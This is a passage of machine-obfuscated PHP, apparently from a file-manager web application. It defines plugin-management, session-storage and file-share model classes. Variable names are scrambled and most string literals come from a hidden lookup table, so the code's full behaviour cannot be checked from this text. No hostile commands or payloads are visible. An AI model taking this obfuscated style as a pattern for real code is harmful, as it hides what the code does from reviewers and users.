$§óÃÎ©‚)); return !1; } return !0; } private function tmpFilesPath() { $õø¸ß =& $_SERVER[ÓïÕü]; $Öãı¸Ò = TEMP_FILES; if ($GLOBALS[$õø¸ß[6]][$õø¸ß[92]][$õø¸ß[889]]) { $Öãı¸Ò = $GLOBALS[$õø¸ß[6]][$õø¸ß[92]][$õø¸ß[889]]; if (!mk_dir($Öãı¸Ò) || !is_writable($Öãı¸Ò) || !IO::mkfile($Öãı¸Ò . $õø¸ß[890])) { $Öãı¸Ò = TEMP_FILES; } } return $Öãı¸Ò; } } goto AÍ´¨ŞĞ²; CŠ×ª¶èŞÊ: class PluginModel extends ModelBaseLight { public $optionType = "\123\x79\x73\x74\145\155\x2e\x70\x6c\165\147\151\x6e\114\151\163\164"; public $field = array("\156\141\155\x65", "\x73\164\141\164\x75\163", "\x72\x65\147\x69\x65\x73\x74", "\143\x6f\156\146\x69\x67"); public function loadList($«Î¸Ìó = false) { $Ÿ›¿´±« = array_to_keyvalue($this->listData(), $_SERVER[ÓïÕü][32]); if ($«Î¸Ìó) { return $Ÿ›¿´±«[$«Î¸Ìó]; } return $Ÿ›¿´±«; } public function init() { $Ûáßá–ı =& $_SERVER[ÓïÕü]; Hook::trigger($Ûáßá–ı[2130]); $Ÿ—ï Ó• = $this->loadPluginList(); foreach ($Ÿ—ï Ó• as $¹€­³ => $Å±·¼œé) { $úú¾°Œï = $this->appAllow($¹€­³, $Å±·¼œé); if (!$úú¾°Œï) { continue; } foreach ($Å±·¼œé[$Ûáßá–ı[2131]] as $ıİ³å½È => $¢•µÍúŞ) { Hook::bind($ıİ³å½È, $¢•µÍúŞ); } } Hook::trigger($Ûáßá–ı[2132]); Hook::trigger(ACTION); } public function appAllow($ÇÃÎ‘Ïç, $Çõ  èœ, $…µë§€« = true) { $ëÔæ”Œœ =& $_SERVER[ÓïÕü]; $¹í²•²Ä = PLUGIN_DIR . $ÇÃÎ‘Ïç . $ëÔæ”Œœ[2133]; if (!is_array($Çõ  èœ) || !is_array($Çõ  èœ[$ëÔæ”Œœ[2131]]) || $Çõ  èœ[$ëÔæ”Œœ[841]] != 1 || !is_file($¹í²•²Ä)) { return !1; } if (KodUser::isRoot()) { if ($GLOBALS[$ëÔæ”Œœ[6]][$ëÔæ”Œœ[2134]] || !$GLOBALS[$ëÔæ”Œœ[6]][$ëÔæ”Œœ[2135]]) { return !0; } $­µ£ƒğ = explode($ëÔæ”Œœ[50], strtolower($GLOBALS[$ëÔæ”Œœ[6]][$ëÔæ”Œœ[2135]])); return in_array(strtolower($ÇÃÎ‘Ïç), $­µ£ƒğ) ? !1 : !0; } if ($…µë§€« && !Action($ëÔæ”Œœ[2136])->checkAuth($ÇÃÎ‘Ïç)) { return !1; } return !0; } public function unInstall($ÔÛ®ñİ´) { $µœ°Ì ° =& $_SERVER[ÓïÕü]; $àéÁ¼¥Œ = $this->loadList($ÔÛ®ñİ´); if (file_exists(PLUGIN_DIR . $ÔÛ®ñİ´)) { Hook::apply($ÔÛ®ñİ´ . $µœ°Ì °[2137]); } $this->remove($àéÁ¼¥Œ[$µœ°Ì °[478]]); } public function changeStatus($¹Ä¶÷Üü, $Ë“ÜÌí) { $·Å‚½Ø° =& $_SERVER[ÓïÕü]; $ğÍÃºÍ‡ = $this->loadList($¹Ä¶÷Üü); if ($Ë“ÜÌí) { Hook::apply($¹Ä¶÷Üü . $·Å‚½Ø°[2138]); } $this->update($ğÍÃºÍ‡[$·Å‚½Ø°[478]], array($·Å‚½Ø°[2139] => $Ë“ÜÌí)); } public function appRegist($ÌÅŒ¶ƒŸ, $¦Ìşà¼À) { $¥Šæ„÷ =& $_SERVER[ÓïÕü]; $û×ôšÜ = $this->loadList($ÌÅŒ¶ƒŸ); if ($û×ôšÜ) { $this->update($û×ôšÜ[$¥Šæ„÷[478]], array($¥Šæ„÷[2131] => $¦Ìşà¼À)); } else { $òø½ßê = array($¥Šæ„÷[32] => $ÌÅŒ¶ƒŸ, $¥Šæ„÷[2131] => $¦Ìşà¼À, $¥Šæ„÷[841] => 0, $¥Šæ„÷[6] => $this->getConfigDefault($ÌÅŒ¶ƒŸ)); $this->insert($òø½ßê); } } public function getConfigDefault($–ÌùÁÔÌ) { $¤âÉ¶ÂÜ =& $_SERVER[ÓïÕü]; $ñã‚à‹õ = array(); $’°ş¤ = $this->getPackageJson($–ÌùÁÔÌ); if (!$’°ş¤ && is_array($’°ş¤[$¤âÉ¶ÂÜ[2140]])) { return $ñã‚à‹õ; } foreach ($’°ş¤[$¤âÉ¶ÂÜ[2140]] as $×ŞıÜàÆ => $åÊ¬Ïï) { if (!isset($åÊ¬Ïï[$¤âÉ¶ÂÜ[453]]) || isset($ñã‚à‹õ[$×ŞıÜàÆ])) { continue; } $ñã‚à‹õ[$×ŞıÜàÆ] = $åÊ¬Ïï[$¤âÉ¶ÂÜ[453]]; } return $ñã‚à‹õ; } public function getPackageJson($Ü¯³ıîÇ) { return Hook::apply($Ü¯³ıîÇ . $_SERVER[ÓïÕü][2141]); } public function getConfig($Õœ³Õ„ê, $—£Ô·ö¯ = false) { $¬„û™êÕ =& $_SERVER[ÓïÕü]; $é¨ŸÕ¥› = array(); $¸ö¢ÚïÎ = $this->loadList($Õœ³Õ„ê); if ($¸ö¢ÚïÎ && is_array($¸ö¢ÚïÎ[$¬„û™êÕ[6]])) { $é¨ŸÕ¥› = $¸ö¢ÚïÎ[$¬„û™êÕ[6]]; } if (!$é¨ŸÕ¥› || $—£Ô·ö¯) { $é¨ŸÕ¥› = $this->getConfigDefault($Õœ³Õ„ê); } return $é¨ŸÕ¥›; } public function setConfig($€§‰¡»”, $ÉáôŸ—í = false) { $€¹¨‹ÜÊ =& $_SERVER[ÓïÕü]; $›°Öİ = $this->loadList($€§‰¡»”); if (!$›°Öİ) { return !1; } $œ•†”¡† = $›°Öİ[$€¹¨‹ÜÊ[6]]; if ($ÉáôŸ—í == !1) { $œ•†”¡† = array(); $ÉáôŸ—í = $this->getConfigDefault($€§‰¡»”); } foreach ($ÉáôŸ—í as $ãÕ»•¨ğ => $÷Ê©Ò“®) { $œ•†”¡†[$ãÕ»•¨ğ] = is_string($÷Ê©Ò“®) ? trim($÷Ê©Ò“®) : $÷Ê©Ò“®; } $this->update($›°Öİ[$€¹¨‹ÜÊ[478]], array($€¹¨‹ÜÊ[6] => $œ•†”¡†)); } public function viewList() { $Êµ ÉêÈ =& $_SERVER[ÓïÕü]; $®óĞìµ  = $this->loadList(); $this->pluginScan($®óĞìµ ); $®óĞìµ  = $this->loadPluginList(); $â·¡‡°ı = array(); foreach ($®óĞìµ  as $’ˆ¦ÃÒµ => $¥üºíÅ) { $Áœ˜¶Áï = $¥üºíÅ; unset($¥üºíÅ[$Êµ ÉêÈ[2131]], $¥üºíÅ[$Êµ ÉêÈ[6]]); $ìÚÃ£Î = PLUGIN_DIR . $¥üºíÅ[$Êµ ÉêÈ[32]] . $Êµ ÉêÈ[2133]; if (!is_file($ìÚÃ£Î)) { continue; } $½ó­÷¬· = Hook::apply($¥üºíÅ[$Êµ ÉêÈ[32]] . $Êµ ÉêÈ[2141]); if (!is_array($½ó­÷¬·)) { continue; } $â·¡‡°ı[$’ˆ¦ÃÒµ] = array_merge($¥üºíÅ, $½ó­÷¬·); if ($Áœ˜¶Áï[$Êµ ÉêÈ[6]][$Êµ ÉêÈ[1719]] != $½ó­÷¬·[$Êµ ÉêÈ[1693]]) { Hook::apply($¥üºíÅ[$Êµ ÉêÈ[32]] . $Êµ ÉêÈ[2138]); $Áœ˜¶Áï[$Êµ ÉêÈ[6]][$Êµ ÉêÈ[1719]] = $½ó­÷¬·[$Êµ ÉêÈ[1693]]; $this->update($¥üºíÅ[$Êµ ÉêÈ[478]], array($Êµ ÉêÈ[6] => $Áœ˜¶Áï[$Êµ ÉêÈ[6]])); } } return $â·¡‡°ı; } private function loadPluginList() { $ÉıüÁ =& $_SERVER[ÓïÕü]; $å£ÔÜ“À = $this->loadList(); if (strtolower(MOD) == $ÉıüÁ[2142]) { return $å£ÔÜ“À; } $­¬™ñòÌ = Hook::trigger($ÉıüÁ[2143], $å£ÔÜ“À); if ($å£ÔÜ“À && !$­¬™ñòÌ) { die; } return $­¬™ñòÌ ? $­¬™ñòÌ : $å£ÔÜ“À; } private function pluginScan($ä…“Ë) { $¤¥÷«ı =& $_SERVER[ÓïÕü]; recursion_dir(PLUGIN_DIR, $ÇŞß„ğ°, $ë¾¼á¢ê, 0); foreach ($ÇŞß„ğ° as $ª™¶Ò³É) { $øÖ˜¶’Ñ = get_path_this($ª™¶Ò³É); if (isset($ä…“Ë[$øÖ˜¶’Ñ]) || !file_exists($ª™¶Ò³É . $¤¥÷«ı[2144]) || !file_exists($ª™¶Ò³É . $¤¥÷«ı[2133])) { continue; } Hook::apply($øÖ˜¶’Ñ . $¤¥÷«ı[2138]); } } } class SessionModel extends ModelBase { protected $tableName = "\x73\x79\163\164\x65\x6d\137\x73\x65\x73\x73\x69\157\156"; public function get($­ºÂÜßà) { $°ìÒïØ¶ =& $_SERVER[ÓïÕü]; $‹çúÔí = $this->where(array($°ìÒïØ¶[2145] => $­ºÂÜßà))->find(); if (!is_array($‹çúÔí)) { return !1; } return $‹çúÔí[$°ìÒïØ¶[171]]; } public function set($‡ŞØ»Ë, $¼—ÖÚæŒ, $·†›î¼ = 3600) { $˜š¼³ê– =& $_SERVER[ÓïÕü]; $ºµŒ†èå = array($˜š¼³ê–[2145] => $‡ŞØ»Ë, $˜š¼³ê–[2045] => $¼—ÖÚæŒ, $˜š¼³ê–[2146] => $·†›î¼ + time()); if (Session::get($˜š¼³ê–[2147])) { $ºµŒ†èå[$˜š¼³ê–[1806]] = Session::get($˜š¼³ê–[2147]); } else { $ºµŒ†èå[$˜š¼³ê–[1806]] = 0; } if ($this->get($‡ŞØ»Ë)) { return $this->where(array($˜š¼³ê–[2145] => $‡ŞØ»Ë))->save($ºµŒ†èå); } else { return $this->add($ºµŒ†èå, array(), !0); } } public function remove($šïÛŒÁì) { return $this->where(array($_SERVER[ÓïÕü][2145] => $šïÛŒÁì))->delete(); } public function clearTimeout() { return $this->where($_SERVER[ÓïÕü][2148] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\x73\150\x61\x72\145"; protected $dataAuto = array(array("\155\x6f\144\x69\x66\171\124\x69\155\145", "\x74\151\155\145", "\x69\x6e\x73\145\x72\x74\54\165\160\x64\x61\x74\x65", "\146\165\x6e\x63\164\151\x6f\x6e"), array("\143\162\145\141\164\x65\x54\x69\155\x65", "\164\x69\155\x65", "\x69\156\x73\x65\x72\164", "\146\x75\156\x63\x74\x69\157\x6e"), array("\157\x70\164\x69\157\156\x73", '', "\151\156\x73\x65\x72\x74\x2c\165\x70\144\141\x74\145\x2c\x73\145\x6c\x65\x63\164", "\x6a\x73\x6f\156")); private $fieldList = "\x2a"; protected function cacheFunctionAlias($ö²İñÙ) { $­½œÕÑ³ =& $_SERVER[ÓïÕü]; $å¬İ–å´ = isset($ö²İñÙ[0]) ? $ö²İñÙ[0] : !1; $ôï”Ù˜Ù = $­½œÕÑ³[2149] . USER_ID; return array($­½œÕÑ³[2150] => array(USER_ID, $­½œÕÑ³[2151]), $­½œÕÑ³[2090] => array($å¬İ–å´, $­½œÕÑ³[2152], $ôï”Ù˜Ù)); } protected function listSimple() { $Âº† = array($_SERVER[ÓïÕü][1806] => USER_ID); $¡ñ¯õá¿ = $this->field($this->fieldList)->where($Âº†)->select(); return $¡ñ¯õá¿ ? $¡ñ¯õá¿ : array(); } protected function getInfo($«Ôó¾ĞÄ, $¼×Õß¡ = false, $ÅõóòŞì = '') { $›¹àÊ­Ú =& $_SERVER[ÓïÕü]; if (!$ÅõóòŞì) { $ÅõóòŞì = $›¹àÊ­Ú[2149] . USER_ID; } if ($¼×Õß¡) { return $this->_getShareInfo(array($›¹àÊ­Ú[673] => $«Ôó¾ĞÄ)); } $Êê²•¢é = $this->cacheFunctionGet($›¹àÊ­Ú[2092], $«Ôó¾ĞÄ, $ÅõóòŞì); $¯ğµÒ—ß = $this->shareInfoMofify($Êê²•¢é, $›¹àÊ­Ú[226]); if (isset($Êê²•¢é[$›¹àÊ­Ú[88]]) && $¯ğµÒ—ß != $Êê²•¢é[$›¹àÊ­Ú[88]]) { $¬ßùäî = $this->cacheKeyMake($›¹àÊ­Ú[2092], $«Ôó¾ĞÄ, $ÅõóòŞì); $Êê²•¢é = $this->_getShareInfo(array($›¹àÊ­Ú[673] => $«Ôó¾ĞÄ)); Cache::set($¬ßùäî, $Êê²•¢é); } return $Êê²•¢é; } private function shareInfoMofify(&$è§×á„Û, $Œ§šæÜˆ = "\x67\x65\164") { $“Ì®øğÒ =& $_SERVER[ÓïÕü]; if (!$è§×á„Û || !isset($è§×á„Û[$“Ì®øğÒ[673]])) { return; } $ƒ·Û®æ = $“Ì®øğÒ[2153] . $è§×á„Û[$“Ì®øğÒ[673]]; if ($Œ§šæÜˆ == $“Ì®øğÒ[226]) { return Cache::get($ƒ·Û®æ); } else { if ($Œ§šæÜˆ == $“Ì®øğÒ[2121]) { $×î¡ŞıŠ = Cache::get($ƒ·Û®æ); if ($×î¡ŞıŠ === $è§×á„Û[$“Ì®øğÒ[88]]) { return; } $è§×á„Û[$“Ì®øğÒ[2154]] = USER_ID . $“Ì®øğÒ[465] . $è§×á„Û[$“Ì®øğÒ[88]]; Cache::set($ƒ·Û®æ, $è§×á„Û[$“Ì®øğÒ[88]]); } else { if ($Œ§šæÜˆ == $“Ì®øğÒ[2155]) { Cache::remove($ƒ·Û®æ); } } } } public function getInfoByHash($Íò™‘ô³) { return $this->_getShareInfo(array($_SERVER[ÓïÕü][2156] => $Íò™‘ô³)); } public function getInfoByPath($Ÿ”Œ«•Ş) { $åÒ‡åÜÉ =& $_SERVER[ÓïÕü]; $Î¶ç© = array($åÒ‡åÜÉ[1806] => USER_ID, $åÒ‡åÜÉ[194] => $Ÿ”Œ«•Ş); return $this->_getShareInfo($Î¶ç©); } public function getInfoBySourcePath($ŠÍ·üÅ) { $´¢ç€ç =& $_SERVER[ÓïÕü]; $‰©×ê²ş = array($´¢ç€ç[1806] => USER_ID, $´¢ç€ç[1285] => $ŠÍ·üÅ); return $this->_getShareInfo($‰©×ê²ş); } private function _getShareInfo($ØøÍ§¢­) { $“—ªÕ¿ =& $_SERVER[ÓïÕü]; $Òâ‘Ç±Ğ = $this->where($ØøÍ§¢­)->find(); if (!$Òâ‘Ç±Ğ) { return !1; } $ØøÍ§¢­ = array($“—ªÕ¿[673] => $Òâ‘Ç±Ğ[$“—ªÕ¿[673]]); $ó™½‹î = $“—ªÕ¿[2157]; $œºá¾â¿ = Model($“—ªÕ¿[674])->order($“—ªÕ¿[478])->field($ó™½‹î)->where($ØøÍ§¢­)->select(); if ($Òâ‘Ç±Ğ[$“—ªÕ¿[194]] == $“—ªÕ¿[231]) { $Òâ‘Ç±Ğ[$“—ªÕ¿[90]] = IO::info($Òâ‘Ç±Ğ[$“—ªÕ¿[1285]]); } else { $Òâ‘Ç±Ğ[$“—ªÕ¿[90]] = Model($“—ªÕ¿[1456])->pathInfo($Òâ‘Ç±Ğ[$“—ªÕ¿[194]]); } $Òâ‘Ç±Ğ[$“—ªÕ¿[2158]] = $œºá¾â¿; $this->shareInfoMofify($Òâ‘Ç±Ğ, $“—ªÕ¿[2121]); return $Òâ‘Ç±Ğ; } protected function getInfoAuth($‰ÇùşÍÒ) { $‹ƒÚ¦Çœ =& $_SERVER[ÓïÕü]; $äëŠÏŸ = $this->getInfo($‰ÇùşÍÒ); if ($äëŠÏŸ[$‹ƒÚ¦Çœ[1806]] == USER_ID) { $äëŠÏŸ[$‹ƒÚ¦Çœ[490]] = $äëŠÏŸ[$‹ƒÚ¦Çœ[90]][$‹ƒÚ¦Çœ[490]]; } else { $äëŠÏŸ[$‹ƒÚ¦Çœ[490]] = Model($‹ƒÚ¦Çœ[572])->authMake($äëŠÏŸ[$‹ƒÚ¦Çœ[2158]]); } return $äëŠÏŸ; } protected function listData($ò ½‘ëõ = null, $àÇûñĞ‡ = 300) { $˜‡Íª–Ÿ =& $_SERVER[ÓïÕü]; $Æï¶Â = array(array($˜‡Íª–Ÿ[567] => array($˜‡Íª–Ÿ[1116], 0), $˜‡Íª–Ÿ[671] => array($˜‡Íª–Ÿ[1116], 0), $˜‡Íª–Ÿ[2159] => $˜‡Íª–Ÿ[2109])); if ($ò ½‘ëõ == $˜‡Íª–Ÿ[2160]) { $Æï¶Â = array($˜‡Íª–Ÿ[567] => 1); } else { if ($ò ½‘ëõ == $˜‡Íª–Ÿ[1269]) { $Æï¶Â = array($˜‡Íª–Ÿ[671] => 1); } } $Æï¶Â[$˜‡Íª–Ÿ[1806]] = USER_ID; $ûğÚƒøŠ = $this->where($Æï¶Â)->selectPage($àÇûñĞ‡); return $ûğÚƒøŠ; } protected function listToMe($Ù±«ñÖ = 300) { $òÚˆÎ…ª =& $_SERVER[ÓïÕü]; $º•õ¶Ü± = Model($òÚˆÎ…ª[2161])->userGroupParents(USER_ID); $–ÑúÅæù = array($òÚˆÎ…ª[656] => SourceModel::TYPE_USER, $òÚˆÎ…ª[574] => USER_ID); if ($º•õ¶Ü±) { $–ÑúÅæù = array(array($òÚˆÎ…ª[656] => SourceModel::TYPE_USER, $òÚˆÎ…ª[574] => USER_ID), array($òÚˆÎ…ª[656] => SourceModel::TYPE_GROUP, $òÚˆÎ…ª[574] => array($òÚˆÎ…ª[7], $º•õ¶Ü±)), $òÚˆÎ…ª[2159] => $òÚˆÎ…ª[2109]); } $íí ıİı = Model($òÚˆÎ…ª[674])->where($–ÑúÅæù)->selectPage($Ù±«ñÖ); $­‰¼ı´• = array_to_keyvalue_group($íí ıİı[$òÚˆÎ…ª[448]], $òÚˆÎ…ª[673]); if (!$­‰¼ı´•) { return $íí ıİı; } $÷°©ÃÏş = $òÚˆÎ…ª[2162]; $–ÑúÅæù = array($òÚˆÎ…ª[673] => array($òÚˆÎ…ª[495], array_keys($­‰¼ı´•)), $òÚˆÎ…ª[1806] => array($òÚˆÎ…ª[1118], $òÚˆÎ…ª[231])); $µ­ù’æš = $this->field($÷°©ÃÏş)->where($–ÑúÅæù)->select(); foreach ($µ­ù’æš as $ûáÌÑğ => &$×¶”©ŠŠ) { $×¶”©ŠŠ[$òÚˆÎ…ª[2158]] = $­‰¼ı´•[$×¶”©ŠŠ[$òÚˆÎ…ª[673]]]; } unset($×¶”©ŠŠ); $ëò¤¹» = array($òÚˆÎ…ª[2163] => $µ­ù’æš, $òÚˆÎ…ª[2164] => $íí ıİı[$òÚˆÎ…ª[445]]); return $ëò¤¹»; } protected function shareAdd($·ƒ¡„š, $˜Ùëî™ù) { $©Êî¢â =& $_SERVER[ÓïÕü]; $¡ã÷á§« = $this->_addShareData($·ƒ¡„š, $˜Ùëî™ù); if (!empty($˜Ùëî™ù[$©Êî¢â[2165]])) { $this->_shareAuthSet($¡ã÷á§«, $˜Ùëî™ù[$©Êî¢â[2165]]); } $this->shareEventAdd($·ƒ¡„š, $˜Ùëî™ù, $©Êî¢â[2166]); return $¡ã÷á§«; } protected function shareAddSystem($”“„ÏÜØ, $–î½Ã’“) { $‘ÌÅ«…­ =& $_SERVER[ÓïÕü]; $çº‹Æò¢ = $this->_addShareData($”“„ÏÜØ, $–î½Ã’“, $‘ÌÅ«…­[192]); $this->_shareAuthSet($çº‹Æò¢, $–î½Ã’“[$‘ÌÅ«…­[2165]]); return $çº‹Æò¢; } private function shareEventAdd($¢ï®¡¥ı, $°ºµÑ¸›, $¡’´·óş = "\x61\144\x64") { $ÖäèÁüÕ =& $_SERVER[ÓïÕü]; if (!$¢ï®¡¥ı || $¢ï®¡¥ı == $ÖäèÁüÕ[231]) { return; } if ($¡’´·óş == $ÖäèÁüÕ[2166]) { if ($°ºµÑ¸›[$ÖäèÁüÕ[567]] == $ÖäèÁüÕ[91]) { Model($ÖäèÁüÕ[641])->eventShare($¢ï®¡¥ı, $ÖäèÁüÕ[2167]); } if ($°ºµÑ¸›[$ÖäèÁüÕ[671]] == $ÖäèÁüÕ[91]) { Model($ÖäèÁüÕ[641])->eventShare($¢ï®¡¥ı, $ÖäèÁüÕ[2168]); } return; } $€À¹ÆƒĞ = $this->getInfoByPath($¢ï®¡¥ı); $‘Çè²ß = $ÖäèÁüÕ[2169]; if ($€À¹ÆƒĞ[$ÖäèÁüÕ[567]] == $ÖäèÁüÕ[231] && $°ºµÑ¸›[$ÖäèÁüÕ[567]] == $ÖäèÁüÕ[91]) { $‘Çè²ß = $ÖäèÁüÕ[2167]; } if ($€À¹ÆƒĞ[$ÖäèÁüÕ[567]] == $ÖäèÁüÕ[91] && $°ºµÑ¸›[$ÖäèÁüÕ[567]] == $ÖäèÁüÕ[231]) { $‘Çè²ß = $ÖäèÁüÕ[2170]; } if ($€À¹ÆƒĞ[$ÖäèÁüÕ[671]] == $ÖäèÁüÕ[231] && $°ºµÑ¸›[$ÖäèÁüÕ[671]] == $ÖäèÁüÕ[91]) { $‘Çè²ß = $ÖäèÁüÕ[2168]; } if ($€À¹ÆƒĞ[$ÖäèÁüÕ[671]] == $ÖäèÁüÕ[91] && $°ºµÑ¸›[$ÖäèÁüÕ[671]] == $ÖäèÁüÕ[231]) { $‘Çè²ß = $ÖäèÁüÕ[2171]; } Model($ÖäèÁüÕ[641])->eventShare($¢ï®¡¥ı, $‘Çè²ß); return; } private function _addShareData($ÛÄÄ²›º, $¶ğ»Õ® = array(), $Çı’ÓÜò = false) { $¹ŸêÚÏ =& $_SERVER[ÓïÕü]; $—•Åó¸ı = $Çı’ÓÜò == $¹ŸêÚÏ[192] ? 0 : USER_ID; $»Ä¡£¼â = array($¹ŸêÚÏ[494] => $ÛÄÄ²›º, $¹ŸêÚÏ[1797] => $—•Åó¸ı); if ($ÛÄÄ²›º == 0) { $»Ä¡£¼â = array($¹ŸêÚÏ[2172] => $¶ğ»Õ®[$¹ŸêÚÏ[1285]], $¹ŸêÚÏ[1797] => $—•Åó¸ı); } if ($Ü©¿€¿â = $this->where($»Ä¡£¼â)->find()) { return $Ü©¿€¿â[$¹ŸêÚÏ[673]]; } if ($ÛÄÄ²›º == 0) { $èØñ ˆ¡ = array($¹ŸêÚÏ[32] => get_path_this($¶ğ»Õ®[$¹ŸêÚÏ[87]])); } else { $èØñ ˆ¡ = Model($¹ŸêÚÏ[921])->sourceInfo($ÛÄÄ²›º); if (!$èØñ ˆ¡) { return !1; } } if (!$¶ğ»Õ®[$¹ŸêÚÏ[1694]]) { $¶ğ»Õ®[$¹ŸêÚÏ[1694]] = $èØñ ˆ¡[$¹ŸêÚÏ[32]]; } $Ô¹é­ªÛ = array($¹ŸêÚÏ[1797] => $—•Åó¸ı, $¹ŸêÚÏ[494] => $ÛÄÄ²›º, $¹ŸêÚÏ[1694] => $¹ŸêÚÏ[12], $¹ŸêÚÏ[567] => 0, $¹ŸêÚÏ[671] => 0, $¹ŸêÚÏ[1285] => $¹ŸêÚÏ[12], $¹ŸêÚÏ[385] => $¹ŸêÚÏ[12], $¹ŸêÚÏ[993] => $¹ŸêÚÏ[12], $¹ŸêÚÏ[2173] => 0, $¹ŸêÚÏ[2174] => 0, $¹ŸêÚÏ[852] => 0, $¹ŸêÚÏ[2175] => $¹ŸêÚÏ[12], $¹ŸêÚÏ[2156] => $¹ŸêÚÏ[12]); $Ôƒ„õáù = explode($¹ŸêÚÏ[50], $¹ŸêÚÏ[2176]); foreach ($Ôƒ„õáù as $€¢‘Ïâ£) { if (!isset($¶ğ»Õ®[$€¢‘Ïâ£])) { continue; } $Ô¹é­ªÛ[$€¢‘Ïâ£] = $¶ğ»Õ®[$€¢‘Ïâ£]; } $­ÓĞ÷ïÃ = $this->add($Ô¹é­ªÛ); $›Áú®ıÉ = array($¹ŸêÚÏ[2156] => short_id($­ÓĞ÷ïÃ)); $this->where(array($¹ŸêÚÏ[2177] => $­ÓĞ÷ïÃ))->save($›Áú®ıÉ); return $­ÓĞ÷ïÃ; } private function _shareAuthSet($³—¶ÙÅ, $Á¤åëÏ©) { $¼œÔñ¿› =& $_SERVER[ÓïÕü]; if (!is_array($Á¤åëÏ©)) { return !1; } $¶áøĞËÕ = Model($¼œÔñ¿›[2119]); $¶áøĞËÕ->where(array($¼œÔñ¿›[673] => $³—¶ÙÅ))->delete(); $°€»³¯› = array(); foreach ($Á¤åëÏ© as $‹íËÄıı) { $¼û¼óÃ = SourceModel::TYPE_USER; if ($‹íËÄıı[$¼œÔñ¿›[191]] == SourceModel::TYPE_GROUP) { $¼û¼óÃ = SourceModel::TYPE_GROUP; } $ÍÕ§›’Ä = array($¼œÔñ¿›[673] => $³—¶ÙÅ, $¼œÔñ¿›[191] => $¼û¼óÃ, $¼œÔñ¿›[574] => intval($‹íËÄıı[$¼œÔñ¿›[574]]), $¼œÔñ¿›[2115] => 0, $¼œÔñ¿›[2178] => -1); if ($‹íËÄıı[$¼œÔñ¿›[2115]]) { $ÍÕ§›’Ä[$¼œÔñ¿›[2115]] = $‹íËÄıı[$¼œÔñ¿›[2115]]; } else { if ($‹íËÄıı[$¼œÔñ¿›[2178]]) { $ÍÕ§›’Ä[$¼œÔñ¿›[2178]] = $‹íËÄıı[$¼œÔñ¿›[2178]]; } } $°€»³¯›[] = $ÍÕ§›’Ä; } return $¶áøĞËÕ->addAll($°€»³¯›, array(), !0); } public function numViewAdd($Æö•’…Í) { $Òæ¯®—« =& $_SERVER[ÓïÕü]; $¸ªŒÔÌ = array($Òæ¯®—«[2177] => $Æö•’…Í); $this->where($¸ªŒÔÌ)->setAdd($Òæ¯®—«[2173]); } public function numDownloadAdd($âşˆ±²ô) { $­íí¾Â =& $_SERVER[ÓïÕü]; $±ë…Øª = array($­íí¾Â[2177] => $âşˆ±²ô); $this->where($±ë…Øª)->setAdd($­íí¾Â[2174]); } protected function shareEdit($‚æâ¶õš, $¢íù˜–õ) { $İêú´ññ =& $_SERVER[ÓïÕü]; $–Î”¦÷± = $this->getInfo($‚æâ¶õš); if (!$–Î”¦÷±) { return !1; } $this->_checkLinkShare($¢íù˜–õ, $–Î”¦÷±); $ş®ˆ°×¨ = array(); $ÚïªìÍæ = explode($İêú´ññ[50], $İêú´ññ[2179]); foreach ($ÚïªìÍæ as $¾Ãß“±Â) { if (!array_key_exists($¾Ãß“±Â, $¢íù˜–õ)) { continue; } $ş®ˆ°×¨[$¾Ãß“±Â] = $¢íù˜–õ[$¾Ãß“±Â]; } $this->shareEventAdd($–Î”¦÷±[$İêú´ññ[194]], $¢íù˜–õ, $İêú´ññ[1976]); $this->where(array($İêú´ññ[2177] => $‚æâ¶õš))->save($ş®ˆ°×¨); if (isset($¢íù˜–õ[$İêú´ññ[2165]])) { $this->_shareAuthSet($‚æâ¶õš, $¢íù˜–õ[$İêú´ññ[2165]]); } return !0; } private function _checkLinkShare($À›¡¥»—, $…²¡… ¿) { $„´­¡ô‡ =& $_SERVER[ÓïÕü]; if ($À›¡¥»—[$„´­¡ô‡[567]] != $„´­¡ô‡[91]) { return; } $É÷‘¤˜ú = $…²¡… ¿[$„´­¡ô‡[90]][$„´­¡ô‡[194]]; if ($…²¡… ¿[$„´­¡ô‡[90]][$„´­¡ô‡[33]] != $„´­¡ô‡[233]) { $âÕìşõ = $this->_folderReport($É÷‘¤˜ú); if (!$âÕìşõ) { return; } show_json(LNG($„´­¡ô‡[2180]) . $„´­¡ô‡[2181] . $âÕìşõ, !1); } $Æ«ËÏ˜  = Model($„´­¡ô‡[921])->fileInfoGet($…²¡… ¿[$„´­¡ô‡[90]][$„´­¡ô‡[194]]); if (!$Æ«ËÏ˜ ) { return; } $ëÙÓ© = $this->shareFileMeta($Æ«ËÏ˜ [$„´­¡ô‡[546]]); if (isset($ëÙÓ©[$„´­¡ô‡[453]]) && $ëÙÓ©[$„´­¡ô‡[453]] == $„´­¡ô‡[91]) { show_json(LNG($„´­¡ô‡[2182]), !1); } } private function _folderReport($şû©ë£•) { $óŸ’¯ô‘ =& $_SERVER[ÓïÕü]; $íÁƒ“–ı = array($óŸ’¯ô‘[546] => array($óŸ’¯ô‘[1116], 0), $óŸ’¯ô‘[841] => 3); $¨§šÃ÷¦ = Model($óŸ’¯ô‘[2183])->where($íÁƒ“–ı)->field($óŸ’¯ô‘[546])->select(); if (!$¨§šÃ÷¦) { return !1; } $¨§šÃ÷¦ = array_to_keyvalue($¨§šÃ÷¦, $óŸ’¯ô‘[12], $óŸ’¯ô‘[546]); $ŒêÜ = $óŸ’¯ô‘[50] . $şû©ë£• . $óŸ’¯ô‘[50]; $íÁƒ“–ı = array($óŸ’¯ô‘[546] => array($óŸ’¯ô‘[7], $¨§šÃ÷¦), $óŸ’¯ô‘[589] => array($óŸ’¯ô‘[462], "\x25{$ŒêÜ}\x25"), $óŸ’¯ô‘[508] => 0); $ëÚéíÍÛ = Model($óŸ’¯ô‘[921])->where($íÁƒ“–ı)->field($óŸ’¯ô‘[2184])->find(); if (!$ëÚéíÍÛ) { return !1; } $³™¹ÚÍ = substr($ëÚéíÍÛ[$óŸ’¯ô‘[589]], strpos($ëÚéíÍÛ[$óŸ’¯ô‘[589]], $ŒêÜ)); $íÁƒ“–ı = array($óŸ’¯ô‘[194] => array($óŸ’¯ô‘[7], trim($³™¹ÚÍ, $óŸ’¯ô‘[50]))); $çºØ˜Ü = Model($óŸ’¯ô‘[921])->where($íÁƒ“–ı)->field($óŸ’¯ô‘[32])->select(); $¨‘ÏÄñÈ = array_to_keyvalue($çºØ˜Ü, $óŸ’¯ô‘[12], $óŸ’¯ô‘[32]); $¨‘ÏÄñÈ[] = $ëÚéíÍÛ[$óŸ’¯ô‘[32]]; return implode($óŸ’¯ô‘[8], 